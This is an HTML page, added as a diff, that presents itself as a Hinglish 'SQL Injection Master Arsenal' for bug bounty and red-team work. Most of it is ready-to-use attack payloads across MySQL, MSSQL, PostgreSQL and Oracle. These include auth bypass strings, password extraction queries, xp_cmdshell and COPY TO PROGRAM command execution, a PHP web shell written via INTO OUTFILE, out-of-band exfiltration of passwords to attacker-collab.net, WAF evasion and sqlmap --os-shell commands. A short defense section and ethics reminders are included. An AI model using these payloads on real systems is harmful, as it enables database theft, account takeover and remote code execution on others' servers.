@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<title>SQL Injection Master Arsenal — Complete Guide</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#30363d;
+    --text:#c9d1d9; --muted:#8b949e;
+    --blue:#58a6ff; --green:#3fb950; --orange:#f0883e;
+    --red:#f85149; --purple:#bc8cff; --yellow:#e3b341; --pink:#ff7ac6;
+  }
+  *{box-sizing:border-box;}
+  body{background:var(--bg); color:var(--text); font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0; line-height:1.65;}
+  header{background:linear-gradient(135deg,#1f2937,#111827); padding:45px 30px; border-bottom:3px solid var(--red); text-align:center;}
+  header h1{color:var(--red); font-size:2.3em; margin:0;}
+  header p{color:var(--muted); margin-top:8px;}
+  .container{max-width:980px; margin:0 auto; padding:30px 20px;}
+  .toc{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:20px 25px; margin-bottom:30px;}
+  .toc h2{color:var(--yellow); margin-top:0;}
+  .toc a{color:var(--blue); text-decoration:none; display:block; padding:4px 0;}
+  .toc a:hover{text-decoration:underline;}
+  section{background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:25px 30px; margin-bottom:25px;}
+  section h2{color:var(--orange); border-bottom:2px solid var(--border); padding-bottom:10px; font-size:1.5em;}
+  section h3{color:var(--green); margin-top:25px;}
+  .badge{display:inline-block; background:var(--red); color:#fff; font-size:0.7em; padding:2px 8px; border-radius:12px; margin-left:8px; vertical-align:middle;}
+  .badge.info{background:var(--blue);} .badge.warn{background:var(--yellow); color:#000;} .badge.adv{background:var(--purple);}
+  .note{background:#1c2333; border-left:4px solid var(--blue); padding:12px 16px; margin:15px 0; border-radius:0 6px 6px 0;}
+  .warn-box{background:#2d1a1a; border-left:4px solid var(--red); padding:12px 16px; margin:15px 0; border-radius:0 6px 6px 0;}
+  pre{background:#010409; border:1px solid var(--border); border-radius:8px; padding:16px; overflow-x:auto; font-size:0.92em;}
+  code{color:var(--green); font-family:'Consolas','Courier New',monospace;}
+  .step{display:flex; gap:15px; margin:15px 0; align-items:flex-start;}
+  .step-num{background:var(--blue); color:#000; font-weight:bold; min-width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0;}
+  table{width:100%; border-collapse:collapse; margin:15px 0;}
+  th, td{border:1px solid var(--border); padding:8px 12px; text-align:left;}
+  th{background:#1c2333; color:var(--yellow);}
+  tr:nth-child(even){background:#141a24;}
+  footer{text-align:center; color:var(--muted); padding:30px; font-size:0.9em;}
+  .db-tag{display:inline-block; background:var(--purple); color:#000; font-size:0.75em; font-weight:bold; padding:2px 8px; border-radius:4px; margin-right:6px;}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>⚔️ SQL Injection Master Arsenal</h1>
+  <p>Union · Error · Blind (Boolean/Time) · Out-of-Band · Stacked · Second-Order · WAF Bypass · Automation</p>
+</header>
+
+<div class="container">
+
+  <div class="toc">
+    <h2>📑 Index</h2>
+    <a href="#basics">1. SQLi Fundamentals</a>
+    <a href="#injection-points">2. Injection Points Kaha Milte Hain</a>
+    <a href="#union">3. UNION-Based SQLi (Full Depth)</a>
+    <a href="#error">4. Error-Based SQLi (Full Depth)</a>
+    <a href="#boolean">5. Boolean-Based Blind SQLi (Full Depth)</a>
+    <a href="#time">6. Time-Based Blind SQLi (Full Depth)</a>
+    <a href="#oob">7. Out-of-Band (OOB) SQLi (Full Depth)</a>
+    <a href="#stacked">8. Stacked Queries SQLi (Full Depth)</a>
+    <a href="#second-order">9. Second-Order SQLi (Full Depth)</a>
+    <a href="#waf-bypass">10. WAF Bypass / Filter Evasion</a>
+    <a href="#sqlmap">11. sqlmap Automation</a>
+    <a href="#defense">12. Defense / Prevention</a>
+    <a href="#megacodes">13. 🔥 Mega Code Vault — Advanced Payloads (All-in-One)</a>
+    <a href="#checklist">14. Practice Checklist</a>
+  </div>
+
+  <section id="basics">
+    <h2>1. SQLi Fundamentals</h2>
+    <p>SQL Injection tab hoti hai jab application user input ko directly SQL query mein concatenate kar deta hai, bina sanitize/parameterize kiye. Attacker input ke through query ki structure hi badal deta hai — result: unauthorized data access, auth bypass, ya kabhi kabhi RCE tak.</p>
+    <table>
+      <tr><th>Type</th><th>Kaam kaise karta hai</th><th>Kab use karein</th></tr>
+      <tr><td>UNION-based</td><td>Extra SELECT inject karke response mein hi data la dete hain</td><td>Jab output directly page pe reflect ho</td></tr>
+      <tr><td>Error-based</td><td>DB error messages mein data leak karwate hain</td><td>Jab verbose errors visible hon</td></tr>
+      <tr><td>Boolean-blind</td><td>True/False condition se page behavior change hota hai</td><td>Jab output visible nahi but page differ karta hai</td></tr>
+      <tr><td>Time-blind</td><td>SLEEP/WAITFOR se response delay measure karte hain</td><td>Jab kuch bhi visible difference na ho</td></tr>
+      <tr><td>Out-of-band</td><td>DNS/HTTP request ke through data exfiltrate hota hai</td><td>Jab in-band/blind dono blocked hon</td></tr>
+      <tr><td>Stacked queries</td><td>Semicolon se multiple statements ek saath chalate hain</td><td>Jab driver/DB multi-statement allow kare</td></tr>
+      <tr><td>Second-order</td><td>Payload store hota hai, baad mein kahi aur trigger hota hai</td><td>Jab input sanitize but later unsafe use ho</td></tr>
+    </table>
+  </section>
+
+  <section id="injection-points">
+    <h2>2. Injection Points Kaha Milte Hain</h2>
+    <div class="step"><div class="step-num">1</div><div><b>URL Parameters</b> — <code>?id=1</code>, <code>?category=shoes</code></div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Search / Filter boxes</b> — backend LIKE queries</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Login forms</b> — username/password fields</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>HTTP Headers</b> — User-Agent, Referer, X-Forwarded-For</div></div>
+    <div class="step"><div class="step-num">5</div><div><b>Cookies</b> — session/tracking cookies jo DB lookup mein use hote hain</div></div>
+    <div class="step"><div class="step-num">6</div><div><b>JSON/API body parameters</b> — REST POST requests</div></div>
+    <div class="step"><div class="step-num">7</div><div><b>Multi-step forms / stored fields</b> — profile name, address (second-order ke liye important)</div></div>
+    <div class="note">Burp Suite se pura traffic intercept karo — <code>Proxy → Intercept → Send to Repeater</code> — aur har parameter systematically test karo.</div>
+  </section>
+
+  <section id="union">
+    <h2>3. UNION-Based SQLi <span class="badge info">In-band</span></h2>
+    <p>UNION operator do SELECT statements ke results combine karta hai. Attacker apna khud ka SELECT inject karta hai taaki data normal output ke saath display ho jaye. Requirement: column count same, data types compatible.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Confirm injectable</b><br><pre><code>id=1'
+id=1"
+id=1)
+id=1--</code></pre></div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Column count (ORDER BY)</b><br><pre><code>' ORDER BY 1--+
+' ORDER BY 2--+
+' ORDER BY 3--+   ← error aaya to pichhla number sahi hai</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>UNION accept confirm karo</b><br><pre><code>' UNION SELECT NULL,NULL,NULL--+</code></pre></div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Reflecting column dhundo</b><br><pre><code>' UNION SELECT 1,2,3--+</code></pre></div></div>
+    <div class="step"><div class="step-num">5</div><div><b>DB info gather karo</b><br><pre><code>' UNION SELECT database(),user(),version()--+</code></pre></div></div>
+    <div class="step"><div class="step-num">6</div><div><b>Table/column enumeration</b><br><pre><code>' UNION SELECT table_name,2,3 FROM information_schema.tables 
+  WHERE table_schema=database()--+
+
+' UNION SELECT column_name,2,3 FROM information_schema.columns 
+  WHERE table_name='users'--+</code></pre></div></div>
+    <div class="step"><div class="step-num">7</div><div><b>Data extract karo</b><br><pre><code>' UNION SELECT username,password,3 FROM users--+</code></pre></div></div>
+
+    <h3>Multiple rows / limited columns handle karna</h3>
+    <pre><code>-- GROUP_CONCAT se sab rows ek saath
+' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '<br>'),2,3 
+  FROM users--+
+
+-- Jab sirf 1 column reflect ho
+' UNION SELECT CONCAT(username,'::',password,'::',email) FROM users--+
+
+-- Row-by-row (jab GROUP_CONCAT truncate ho jaye)
+' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0--+</code></pre>
+  </section>
+
+  <section id="error">
+    <h2>4. Error-Based SQLi <span class="badge info">In-band</span></h2>
+    <p>Jab application verbose DB errors return karta hai, attacker error message ke andar hi data leak karwa sakta hai — ye tab useful hai jab UNION possible na ho (column mismatch, filtering etc.) but errors visible hon.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Error trigger confirm karo</b><br><pre><code>id=1'</code></pre> Agar raw MySQL/MSSQL error page pe dikhta hai → error-based candidate</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Data ko error message mein force karo</b> (MySQL — <code>extractvalue</code>/<code>updatexml</code> XPath error abuse karte hain)</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Extracted string ko error output se read karo</b></div></div>
+
+    <h3><span class="db-tag">MySQL</span> Error-based Payloads</h3>
+    <pre><code>-- extractvalue() XPath error trick
+' AND extractvalue(1,concat(0x7e,(SELECT database())))--+
+
+-- updatexml() variant
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)--+
+
+-- Table names via error
+' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM 
+  information_schema.tables LIMIT 1)))--+
+
+-- Double query error (older MySQL)
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
+  (SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM 
+  information_schema.tables GROUP BY x)a)--+</code></pre>
+
+    <h3><span class="db-tag">MSSQL</span> Error-based Payloads</h3>
+    <pre><code>-- Conversion error se data leak
+' AND 1=CONVERT(int,(SELECT @@version))--+
+
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM 
+  information_schema.tables))--+</code></pre>
+
+    <h3><span class="db-tag">PostgreSQL</span> Error-based</h3>
+    <pre><code>' AND 1=CAST((SELECT version()) AS int)--+</code></pre>
+
+    <h3><span class="db-tag">Oracle</span> Error-based</h3>
+    <pre><code>' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version 
+  WHERE rownum=1))--+</code></pre>
+  </section>
+
+  <section id="boolean">
+    <h2>5. Boolean-Based Blind SQLi</h2>
+    <p>Jab response mein data visible nahi hota lekin page ka behavior (content, length, presence of an element) query ke true/false result ke hisaab se badalta hai.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Baseline true/false compare karo</b><br><pre><code>' AND 1=1--+   (normal page — TRUE)
+' AND 1=2--+   (different/empty page — FALSE)</code></pre></div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Character-by-character extraction</b> — condition ko data pe base karo<br><pre><code>' AND SUBSTRING(database(),1,1)='a'--+
+' AND SUBSTRING(database(),1,1)='b'--+
+... (a-z, 0-9 try karte jao har position ke liye)</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>ASCII-based comparison</b> (faster, binary search ke saath automate ho sakta hai)<br><pre><code>' AND ASCII(SUBSTRING(database(),1,1))>77--+
+' AND ASCII(SUBSTRING(database(),1,1))=109--+</code></pre></div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Table/column existence check</b><br><pre><code>' AND (SELECT COUNT(*) FROM users)>0--+
+' AND (SELECT COUNT(*) FROM information_schema.tables 
+  WHERE table_name='admin')>0--+</code></pre></div></div>
+
+    <h3>Automation logic (binary search se fast)</h3>
+    <pre><code># Python pseudo-logic for boolean blind extraction
+import requests
+
+def get_char(position):
+    low, high = 32, 126
+    while low < high:
+        mid = (low + high) // 2
+        payload = f"' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--+"
+        r = requests.get(f"https://target.com/page?id=1{payload}")
+        if "Welcome" in r.text:   # TRUE condition indicator
+            low = mid + 1
+        else:
+            high = mid
+    return chr(low)
+
+result = "".join(get_char(i) for i in range(1, 20))
+print(result)</code></pre>
+  </section>
+
+  <section id="time">
+    <h2>6. Time-Based Blind SQLi</h2>
+    <p>Jab response mein koi visible difference hi nahi hota (same content har condition mein) — tab response delay measure karke true/false confirm karte hain.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Baseline delay confirm karo</b><br><pre><code>' AND SLEEP(5)--+          -- MySQL
+'; WAITFOR DELAY '0:0:5'--+  -- MSSQL
+' AND pg_sleep(5)--+        -- PostgreSQL
+' AND dbms_lock.sleep(5)=1--+  -- Oracle</code></pre>
+    Agar response 5 sec delay ho gaya → confirmed time-blind SQLi</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Conditional time delay se data extract karo</b><br><pre><code>' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--+
+' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(5),0)--+</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>MSSQL conditional</b><br><pre><code>IF (SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)='a') 
+  WAITFOR DELAY '0:0:5'--+</code></pre></div></div>
+
+    <h3>Advanced — heavy query based delay (jab SLEEP() blocked ho)</h3>
+    <pre><code>-- MySQL heavy query delay trick (SLEEP filter bypass)
+' AND (SELECT COUNT(*) FROM information_schema.columns A, 
+  information_schema.columns B, information_schema.columns C)--+</code></pre>
+  </section>
+
+  <section id="oob">
+    <h2>7. Out-of-Band (OOB) SQLi</h2>
+    <p>Jab in-band aur blind dono possible na hon (firewall response block kar deta hai ya bohot slow hai), tab DNS/HTTP request ke through data attacker-controlled server pe bhejte hain.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>OOB listener setup karo</b> — Burp Collaborator ya khud ka DNS server (interactsh, dnslog.cn)</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>DB se DNS lookup trigger karwao</b> data ke saath</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Collaborator/listener pe incoming request check karo</b> — subdomain mein data encoded hoga</div></div>
+
+    <h3><span class="db-tag">MSSQL</span></h3>
+    <pre><code>'; DECLARE @data VARCHAR(1024);
+SELECT @data=(SELECT TOP 1 password FROM users);
+EXEC('master..xp_dirtree "\\'+@data+'.attacker-collab.net\\a"')--+</code></pre>
+
+    <h3><span class="db-tag">Oracle</span></h3>
+    <pre><code>' UNION SELECT UTL_HTTP.REQUEST('http://'||(SELECT password 
+  FROM users WHERE rownum=1)||'.attacker-collab.net') FROM dual--+</code></pre>
+
+    <h3><span class="db-tag">MySQL</span> (limited, needs specific privileges)</h3>
+    <pre><code>' UNION SELECT LOAD_FILE(CONCAT('\\\\',
+  (SELECT password FROM users LIMIT 1),
+  '.attacker-collab.net\\a'))--+</code></pre>
+
+    <div class="note">OOB technique advanced hai aur mostly authorized red team engagements mein use hoti hai jaha network egress allowed ho. Bug bounty mein Burp Collaborator best tool hai isko detect karne ke liye.</div>
+  </section>
+
+  <section id="stacked">
+    <h2>8. Stacked Queries SQLi</h2>
+    <p>Kuch DB drivers (MSSQL, PostgreSQL, PHP PDO with multi-statement) semicolon se separate multiple statements ek saath execute karne dete hain — attacker ek query ke baad completely alag statement (INSERT/UPDATE/DROP/EXEC) chala sakta hai.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Stacked query support confirm karo</b><br><pre><code>1'; SELECT 1--+</code></pre> Agar error nahi aaya aur behavior change hua → stacked queries possible</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Harmless test se confirm karo (time delay)</b><br><pre><code>1'; WAITFOR DELAY '0:0:5'--+</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Actual impact karo (sirf authorized scope mein, minimum necessary)</b></div></div>
+
+    <h3><span class="db-tag">MSSQL</span></h3>
+    <pre><code>-- Command execution (agar xp_cmdshell enabled)
+'; EXEC xp_cmdshell('whoami')--+
+
+-- New admin user create karna (impact demo ke liye, PoC only)
+'; EXEC sp_addlogin 'hacker','Password123'--+
+
+-- Data modify
+'; UPDATE users SET password='hacked' WHERE username='admin'--+</code></pre>
+
+    <h3><span class="db-tag">PostgreSQL</span></h3>
+    <pre><code>-- Command execution via COPY TO PROGRAM (superuser required)
+'; COPY (SELECT '') TO PROGRAM 'id'--+
+
+-- Data insert
+'; INSERT INTO users(username,password) VALUES('hacker','pass123')--+</code></pre>
+
+    <div class="warn-box">Stacked queries se DROP/UPDATE/DELETE jaisi destructive commands avoid karo authorized test mein bhi — sirf non-destructive PoC (jaise SELECT/WAITFOR) use karo jab tak scope explicitly allow na kare.</div>
+  </section>
+
+  <section id="second-order">
+    <h2>9. Second-Order SQLi</h2>
+    <p>Payload turant execute nahi hota — pehle safely store hota hai (e.g. registration form ka "name" field), aur baad mein kisi aur function/page mein us data ko unsafe tarike se query mein use kiya jata hai, jaha injection trigger hoti hai.</p>
+
+    <h3>Step-by-Step</h3>
+    <div class="step"><div class="step-num">1</div><div><b>Input jo store hota hai identify karo</b> — username, display name, address, profile bio</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>Payload waha submit karo</b><br><pre><code>Username: admin'--</code></pre></div></div>
+    <div class="step"><div class="step-num">3</div><div><b>App ke andar dusri jagah dhundo jaha ye stored value dobara query mein use hoti hai</b> — jaise "change password", "view profile", "admin panel search"</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Us dusri feature ko trigger karo</b> aur dekho ki stored payload execute hui ya nahi</div></div>
+
+    <h3>Classic Example</h3>
+    <pre><code>-- Step 1: Registration ke waqt username field mein
+Username: admin'--
+
+-- Step 2: Backend jab "change password" query banata hai:
+UPDATE users SET password='newpass' WHERE username='admin'--'
+
+-- Yaha '-- ne baaki query comment kar diya,
+-- effectively admin ka password change ho gaya bina uska password 
+-- verify kiye (agar WHERE clause mein password check tha)</code></pre>
+
+    <div class="note">Second-order SQLi manual testing mein miss ho jati hai kyunki automated scanners aksar sirf immediate response check karte hain, stored-then-triggered flow nahi follow karte. Application ko end-to-end manually walk-through karna zaroori hai.</div>
+  </section>
+
+  <section id="waf-bypass">
+    <h2>10. WAF Bypass / Filter Evasion <span class="badge warn">Advanced</span></h2>
+    <table>
+      <tr><th>Filter block ho raha</th><th>Bypass technique</th></tr>
+      <tr><td>Space filtered</td><td><code>/**/</code>, <code>+</code>, tab, <code>%0a</code></td></tr>
+      <tr><td>UNION+SELECT filtered</td><td><code>UNI/**/ON SEL/**/ECT</code>, case mixing <code>UnIoN sElEcT</code></td></tr>
+      <tr><td>Quotes filtered</td><td>Hex encoding: <code>0x61646d696e</code> instead of <code>'admin'</code></td></tr>
+      <tr><td>Comments (--) filtered</td><td>Use <code>#</code> (MySQL) ya balanced parentheses</td></tr>
+      <tr><td>Keyword blacklist</td><td>Double encoding, inline comments <code>SEL/*x*/ECT</code></td></tr>
+      <tr><td>OR/AND filtered</td><td><code>&amp;&amp;</code>, <code>||</code> (MySQL supports)</td></tr>
+      <tr><td>= sign filtered</td><td><code>LIKE</code>, <code>RLIKE</code> use karo</td></tr>
+      <tr><td>Length-limited WAF</td><td>Payload ko chunks mein tod ke multiple requests se bhejo</td></tr>
+    </table>
+
+    <h3>Encoding tricks</h3>
+    <pre><code>-- URL double encoding
+%2527  →  decode hoke ' ban jata hai (kuch WAF single-decode karte hain)
+
+-- Unicode trick
+%u0027 → some legacy WAFs ise bypass kar dete hain
+
+-- Case + comment mix
+SeLeCt/**/UsErNaMe/**/FrOm/**/uSeRs</code></pre>
+    <div class="warn-box">WAF bypass sirf authorized scope ke andar hi try karo.</div>
+  </section>
+
+  <section id="sqlmap">
+    <h2>11. sqlmap Automation</h2>
+    <pre><code># Basic scan (auto-detects technique)
+sqlmap -u "https://target.com/page?id=1" --batch
+
+# Force specific technique
+sqlmap -u "https://target.com/page?id=1" --technique=U --batch   # UNION
+sqlmap -u "https://target.com/page?id=1" --technique=E --batch   # Error
+sqlmap -u "https://target.com/page?id=1" --technique=B --batch   # Boolean
+sqlmap -u "https://target.com/page?id=1" --technique=T --batch   # Time
+sqlmap -u "https://target.com/page?id=1" --technique=S --batch   # Stacked
+
+# Column count already known
+sqlmap -u "https://target.com/page?id=1" --union-cols=3 --technique=U
+
+# Databases / tables / columns / dump
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --columns
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users -C username,password --dump
+
+# Cookie / POST / header injection
+sqlmap -u "https://target.com/page" --cookie="session=abc123*" --batch
+sqlmap -r request.txt --batch --technique=U
+sqlmap -u "https://target.com/page?id=1" --headers="X-Forwarded-For: 1*"
+
+# OS shell (agar stacked + privileges allow karein)
+sqlmap -u "https://target.com/page?id=1" --os-shell
+
+# WAF/tamper evasion
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,charencode --random-agent
+
+# Risk/level increase (deeper testing, more payloads)
+sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3</code></pre>
+  </section>
+
+  <section id="defense">
+    <h2>12. Defense / Prevention <span class="badge info">Developer Side</span></h2>
+    <div class="step"><div class="step-num">1</div><div><b>Parameterized Queries / Prepared Statements</b> — user input query string mein kabhi directly concatenate na ho</div></div>
+    <div class="step"><div class="step-num">2</div><div><b>ORM frameworks</b> use karo jo auto-escape karte hain</div></div>
+    <div class="step"><div class="step-num">3</div><div><b>Least privilege</b> — DB user ko sirf zaroori permissions (no FILE, no DROP)</div></div>
+    <div class="step"><div class="step-num">4</div><div><b>Input validation</b> — whitelist-based, expected type enforce karo</div></div>
+    <div class="step"><div class="step-num">5</div><div><b>Generic error messages</b> — DB errors user ko show mat karo</div></div>
+    <div class="step"><div class="step-num">6</div><div><b>WAF</b> extra layer ke roop mein, primary defense nahi</div></div>
+    <div class="step"><div class="step-num">7</div><div><b>Second-order ke liye</b> — har jagah input use ho raha hai wahan parameterize karo, sirf entry point pe nahi</div></div>
+  </section>
+
+  <section id="megacodes">
+    <h2>13. 🔥 Mega Code Vault — Advanced Payloads (All-in-One) <span class="badge adv">Advanced</span></h2>
+    <p>Sabhi techniques ke ready-to-use advanced payloads ek jagah — quick reference ke liye.</p>
+
+    <h3><span class="db-tag">MySQL</span> Complete Set</h3>
+    <pre><code>-- Auth bypass
+' OR '1'='1
+' OR 1=1--+
+admin'--
+admin' #
+' OR 1=1 LIMIT 1--+
+
+-- UNION full chain
+' UNION SELECT NULL,NULL,NULL--+
+' UNION SELECT 1,2,3--+
+' UNION SELECT @@version,user(),database()--+
+' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM 
+  information_schema.tables WHERE table_schema=database()--+
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM 
+  information_schema.columns WHERE table_name='users'--+
+' UNION SELECT GROUP_CONCAT(username,0x3a,password 
+  SEPARATOR 0x3c62723e),2,3 FROM users--+
+
+-- Error-based
+' AND extractvalue(1,concat(0x7e,database()))--+
+' AND updatexml(1,concat(0x7e,version()),1)--+
+
+-- Blind boolean
+' AND SUBSTRING(database(),1,1)='a'--+
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--+
+
+-- Blind time
+' AND SLEEP(5)--+
+' AND IF(1=1,SLEEP(5),0)--+
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--+
+
+-- File operations (needs FILE priv + secure_file_priv unset)
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--+
+' UNION SELECT '<?php system($_GET["c"]);?>',2,3 
+  INTO OUTFILE '/var/www/html/shell.php'--+</code></pre>
+
+    <h3><span class="db-tag">MSSQL</span> Complete Set</h3>
+    <pre><code>-- Auth bypass
+' OR 1=1--
+admin'--
+
+-- UNION
+' UNION SELECT NULL,NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+-- Error-based
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects 
+  WHERE xtype='U'))--
+
+-- Blind time
+'; WAITFOR DELAY '0:0:5'--
+IF (1=1) WAITFOR DELAY '0:0:5'--
+
+-- Stacked / command exec
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--</code></pre>
+
+    <h3><span class="db-tag">PostgreSQL</span> Complete Set</h3>
+    <pre><code>-- UNION
+' UNION SELECT NULL,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables 
+  WHERE table_schema='public'--
+
+-- Error-based
+' AND 1=CAST((SELECT version()) AS int)--
+
+-- Blind time
+' AND pg_sleep(5)--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- Command execution (superuser + extension)
+'; COPY (SELECT '') TO PROGRAM 'id'--</code></pre>
+
+    <h3><span class="db-tag">Oracle</span> Complete Set</h3>
+    <pre><code>-- UNION (dual table zaroori)
+' UNION SELECT banner,NULL FROM v$version--
+' UNION SELECT table_name,NULL FROM all_tables--
+' UNION SELECT column_name,NULL FROM all_tab_columns 
+  WHERE table_name='USERS'--
+
+-- Error-based
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version 
+  WHERE rownum=1))--
+
+-- Blind time
+' AND dbms_lock.sleep(5)=1--</code></pre>
+
+    <h3>Burp Suite Repeater Quick Test Sequence</h3>
+    <pre><code>1) baseline: id=1
+2) id=1'
+3) id=1' AND 1=1--+
+4) id=1' AND 1=2--+
+5) id=1' ORDER BY 1--+  (increment until error)
+6) id=1' UNION SELECT NULL,NULL,NULL--+
+7) id=1' UNION SELECT 1,2,3--+
+8) id=1' UNION SELECT database(),user(),version()--+</code></pre>
+  </section>
+
+  <section id="checklist">
+    <h2>14. Practice Checklist ✅</h2>
+    <table>
+      <tr><th>Task</th><th>Status</th></tr>
+      <tr><td>Quote/error confirm kiya</td><td>☐</td></tr>
+      <tr><td>UNION column count nikala</td><td>☐</td></tr>
+      <tr><td>Error-based extraction try kiya</td><td>☐</td></tr>
+      <tr><td>Boolean blind confirm kiya</td><td>☐</td></tr>
+      <tr><td>Time blind confirm kiya</td><td>☐</td></tr>
+      <tr><td>OOB listener (Collaborator) try kiya</td><td>☐</td></tr>
+      <tr><td>Stacked query support check kiya</td><td>☐</td></tr>
+      <tr><td>Second-order flow (stored input) test kiya</td><td>☐</td></tr>
+      <tr><td>Tables/columns enumerate kiye</td><td>☐</td></tr>
+      <tr><td>Data extract kiya (minimum PoC)</td><td>☐</td></tr>
+      <tr><td>sqlmap se cross-verify kiya</td><td>☐</td></tr>
+      <tr><td>Screenshots + request/response save kiye</td><td>☐</td></tr>
+      <tr><td>Remediation section likha report mein</td><td>☐</td></tr>
+    </table>
+    <div class="warn-box">
+      <b>Ethics reminder:</b> Sirf authorized scope pe hi test karo. Minimum necessary data extract karo — pura DB dump mat karo. Destructive queries (DROP/DELETE/UPDATE) avoid karo jab tak scope explicitly allow na kare.
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  Made for Karan's Bug Bounty → Red Team journey | Har cheez mein poochho — Yeh kaise toot sakta hai?
+</footer>
+
+</body>
+</html>
